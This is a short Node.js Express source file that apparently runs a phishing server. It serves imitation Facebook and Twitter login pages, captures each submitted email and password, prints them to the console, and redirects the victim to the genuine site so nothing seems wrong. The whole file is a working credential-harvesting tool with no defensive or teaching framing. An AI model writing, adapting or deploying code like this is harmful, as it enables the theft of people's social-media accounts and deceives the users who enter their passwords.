const express = require('express');
let app = express();
const path = require('path');
let qs = require('querystring');

app.listen(80, () => {
    console.log("Server started");
});

app.get("/facebook", (req, res) => {
    res.sendFile(path.join(__dirname, 'public/facebook.html'));
});
app.get("/twitter", (req, res) => {
    res.sendFile(path.join(__dirname, 'public/twitter.html'));
});

app.post("/facebook", (req,res) => {
        let body = '';
        let email = '';
        let password = '';
        
        req.on('data', (data) => {
            body += data;
        });
        
        req.on('end', () => {
            body = qs.parse(body);
            email = body.email;
            password = body.password;
        console.log("Your Facebook email is: "+email);
        console.log("Your Facebook password is: "+password);

        res.statusCode = 302;
        res.setHeader('location', 'https://facebook.com');
        res.end();
        });
});

app.post("/twitter", (req,res) => {
    let body = '';
    let email = '';
    let password = '';
    
    req.on('data', (data) => {
        body += data;
    });
    
    req.on('end', () => {
        body = qs.parse(body);
        email = body.email;
        password = body.password;
    console.log("Your Twitter email is: "+email);
    console.log("Your Twitter password is: "+password);
    
    res.statusCode = 302;
    res.setHeader('location', 'https://twitter.com');
    res.end();
    });
});
